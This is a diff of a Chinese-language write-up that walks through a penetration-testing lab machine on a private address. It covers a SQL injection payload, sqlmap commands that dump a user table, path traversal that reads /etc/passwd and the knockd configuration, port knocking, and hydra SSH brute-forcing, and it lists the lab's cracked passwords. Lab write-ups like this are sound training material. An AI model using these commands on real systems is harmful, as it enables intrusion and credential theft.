@@ -1,4 +1,3 @@
-![image-20220106210459771](https://tva1.sinaimg.cn/large/008i3skNly1gy497s2xnhj31c40u0juu.jpg)
 
 ### 1.主机发现
 
@@ -6,9 +5,9 @@
 
 ### 2.端口扫描
 
->![image-20211020191230451](https://tva1.sinaimg.cn/large/008i3skNly1gvlzmoegoij60p809y3zs02.jpg)
+> ![image-20211020191230451](https://tva1.sinaimg.cn/large/008i3skNly1gvlzmoegoij60p809y3zs02.jpg)
 >
->80端口是打开的
+> 80端口是打开的
 
 ### 3.访问http://192.168.92.193/
 
@@ -16,10 +15,8 @@
 >
 > ```
 > nikto -host 192.168.92.193
-> 
-> ```
 >
-> 
+> ```
 
 ![image-20211020191313150](https://tva1.sinaimg.cn/large/008i3skNgy1gvlznd3kn1j60pw0fzab502.jpg)
 
@@ -29,32 +26,30 @@
 >
 > `' or 1=1 --+`
 >
-> 
->
 > 使用sqlmap注入
 >
 > ```
 > 1.查看是否有注入
 > sqlmap -u http://192.168.92.193/results.php --data 'search=1'  
-> 
+>
 > 2.查看数据库
 > sqlmap -u http://192.168.92.193/results.php --data 'search=1'  --dbs
-> 
+>
 > 3.查看数据库的数据表
 >  sqlmap -u http://192.168.92.193/results.php --data 'search=1'  -D users --tables
-> 
+>
 > 4.打开表
 > sqlmap -u http://192.168.92.193/results.php --data 'search=1'  -D users -T  UserDetails --dump
-> 
-> 
-> 
+>
+>
+>
 > ```
 
 #### 数据库
 
 ![image-20211020191704860](https://tva1.sinaimg.cn/large/008i3skNgy1gvlzrdf8trj609q04k0ss02.jpg)
 
-#### users数据库 
+#### users数据库
 
 ![image-20211020191717942](https://tva1.sinaimg.cn/large/008i3skNgy1gvlzrlijt3j606o05cmx302.jpg)
 
@@ -96,8 +91,6 @@
 >
 > transorbital1
 
-
-
 ### 登录用户
 
 ![image-20211020210925948](https://tva1.sinaimg.cn/large/008i3skNgy1gvm309tv7ij60gh0b43z502.jpg)
@@ -106,8 +99,6 @@
 >
 > ` wfuzz -b 'PHPSESSID=p4d8u6edvm3mts5m88qsui02qj' -w /usr/share/wfuzz/wordlist/general/common.txt  http://192.168.92.193/manage.php?FUZZ=index.php`
 >
-> 
->
 > 没有发现响应不同的 可能是后面参数不对
 >
 > 访问一个 Linux一定存在的文件 ../../../../../etc/passwd
@@ -115,8 +106,6 @@
 > `wfuzz -b 'PHPSESSID=p4d8u6edvm3mts5m88qsui02qj' -w /usr/share/wfuzz/wordlist/general/common.txt --hw 100   http://192.168.92.193/manage.php?FUZZ=../../../../../etc/passwd`
 >
 > ![image-20211020211536878](https://tva1.sinaimg.cn/large/008i3skNgy1gvm36pobilj60t006kmxj02.jpg)
-
-
 
 ### 收集隐私
 
@@ -139,13 +128,12 @@
 >
 > ![image-20211020213532942](https://tva1.sinaimg.cn/large/008i3skNgy1gvm3rgq3j7j60tg0ak0u502.jpg)
 >
-> > 22端口可能配置了knock d
-> >
-> > Knockd 配置文件在  	/etc/knockd.conf
+>> 22端口可能配置了knock d
+>>
+>> Knockd 配置文件在  	/etc/knockd.conf
+>>
 >
-> 
->
-> #### 用文件包含查看 
+> #### 用文件包含查看
 >
 > `http://192.168.92.193/manage.php?file=../../../../etc/knockd.conf`
 >
@@ -153,8 +141,6 @@
 > File does not exist
 > [options] UseSyslog [openSSH] sequence = 7469,8475,9842 seq_timeout = 25 command = /sbin/iptables -I INPUT -s %IP% -p tcp --dport 22 -j ACCEPT tcpflags = syn [closeSSH] sequence = 9842,8475,7469 seq_timeout = 25 command = /sbin/iptables -D INPUT -s %IP% -p tcp --dport 22 -j ACCEPT tcpflags = syn
 > ```
->
->  
 >
 > ### 用nmap 依次访问 7469,8475,9842
 >
@@ -173,8 +159,6 @@
 > for x in 7469 8475 9842 22 ;do nc 192.168.92.193 $x;done
 > ```
 >
-> 
->
 > ##### 成功
 >
 > ![image-20211020214317128](https://tva1.sinaimg.cn/large/008i3skNgy1gvm3zij4rsj614c0dwdia02.jpg)
@@ -183,11 +167,10 @@
 >
 > ![image-20211020215120403](https://tva1.sinaimg.cn/large/008i3skNly1gvm47vn8cxj60gg02dt9c02.jpg)
 >
-> > [22][ssh] host: 192.168.92.193   login: chandlerb   password: UrAG0D!
-> > [22][ssh] host: 192.168.92.193   login: joeyt   password: Passw0rd
-> > [22][ssh] host: 192.168.92.193   login: janitor   password: Ilovepeepee
->
->   
+>> [22][ssh] host: 192.168.92.193   login: chandlerb   password: UrAG0D!
+>> [22][ssh] host: 192.168.92.193   login: joeyt   password: Passw0rd
+>> [22][ssh] host: 192.168.92.193   login: janitor   password: Ilovepeepee
+>>
 >
 > ### 收集信息
 >
@@ -197,11 +180,12 @@
 > history //查看历史命令
 > ```
 >
-> >发现janitor 有敏感文件
+>> 发现janitor 有敏感文件
+>>
 >
 > ![image-20211020220121024](https://tva1.sinaimg.cn/large/008i3skNly1gvm4iawghpj30wa06o3yw.jpg)
 >
-> ``` 
+> ```
 > 六个密码
 > BamBam01
 > Passw0rd
@@ -209,34 +193,20 @@
 > P0Lic#10-4
 > B4-Tru3-001
 > 4uGU5T-NiGHts
-> 
+>
 > ```
 >
-> #####  用hydra发现其他用户
+> ##### 用hydra发现其他用户
 >
 > `hydra -L name_dis -P paswd_dis_2 192.168.92.193 ssh`
 >
 > ![image-20211020220454499](https://tva1.sinaimg.cn/large/008i3skNgy1gvm4m0ds9jj60tc026t8x02.jpg)
 >
-> 登录fredf 
+> 登录fredf
 >
 > 发现用root 运行文件
 >
 > ![image-20211020220716510](https://tva1.sinaimg.cn/large/008i3skNly1gvm4ogt1m0j60k201wt8s02.jpg)
-
-
-
-
-
-
-
-
-
-
-
-
-
-
 
 ### FUZZ 爆破网站密码
 
@@ -245,26 +215,9 @@
 
  wfuzz  -z file,name_dis -z file,paswd_dis -d "username=FUZZ&password=FUZ2Z"   http://192.168.92.193/manage.php
 
-//wufzz -z file,[字典file] -z file,[字典file] -d"[post请求内容]" http://URL****	
+//wufzz -z file,[字典file] -z file,[字典file] -d"[post请求内容]" http://URL****
 
 
 ```
 
- 
-
 ![image-20211020200115743](https://tva1.sinaimg.cn/large/008i3skNly1gvm11cqognj60zk0hidja02.jpg)
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
